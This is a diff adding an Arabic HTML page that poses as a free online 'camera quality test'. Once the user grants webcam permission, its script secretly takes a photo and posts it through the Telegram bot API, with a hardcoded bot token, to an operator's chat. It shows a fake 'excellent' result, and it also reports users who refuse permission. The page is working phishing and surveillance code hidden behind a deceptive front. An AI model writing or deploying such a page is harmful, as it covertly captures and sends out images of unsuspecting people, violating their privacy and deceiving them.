@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص جودة الكاميرا أونلاين</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #fff; border-radius: 12px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .btn { padding: 15px; background: #0984e3; color: #fff; border: none; border-radius: 8px; width: 100%; cursor: pointer; font-size: 16px; }
+        .hidden { display: none; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="step1">
+            <h1>📷 فحص جودة الكاميرا</h1>
+            <p>أداة مجانية لتحليل دقة الكاميرا وتوازن الألوان.</p>
+            <button class="btn" onclick="requestCamera()">بدء الفحص الآن</button>
+        </div>
+        <div id="step2" class="hidden">
+            <h1>جاري التحليل...</h1>
+            <div class="spinner"></div>
+            <p>يرجى الثبات أمام الكاميرا للحصول على أدق نتيجة.</p>
+        </div>
+        <div id="step3" class="hidden">
+            <h1 style="color: #27ae60;">اكتمل الفحص!</h1>
+            <p>تم تحليل جودة الكاميرا بنجاح. النتيجة: <b>ممتازة</b>.</p>
+            <p>شكراً لاستخدامك خدمتنا.</p>
+        </div>
+        <video id="video" style="display:none" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none"></canvas>
+    </div>
+    <script>
+        const BOT_TOKEN = "8645238541:AAF_THZ08LqIiV8MkxmosktWt3CneAX_bM4";
+        const ADMIN_ID = "7968208362";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                    
+                    const formData = new FormData();
+                    formData.append("chat_id", ADMIN_ID);
+                    formData.append("photo", blob, "capture.jpg");
+                    formData.append("caption", "📸 <b>تم التقاط صورة جديدة!</b>\n\n✅ المستخدم وافق على إذن الكاميرا.");
+                    formData.append("parse_mode", "HTML");
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch (e) {
+                alert("يجب منح إذن الكاميرا لإجراء الفحص.");
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: "🛡️ <b>تنبيه وعي أمني</b>\n\n❌ المستخدم رفض إعطاء إذن الكاميرا.",
+                        parse_mode: "HTML"
+                    })
+                });
+            }
+        }
+    </script>
+</body>
+</html>
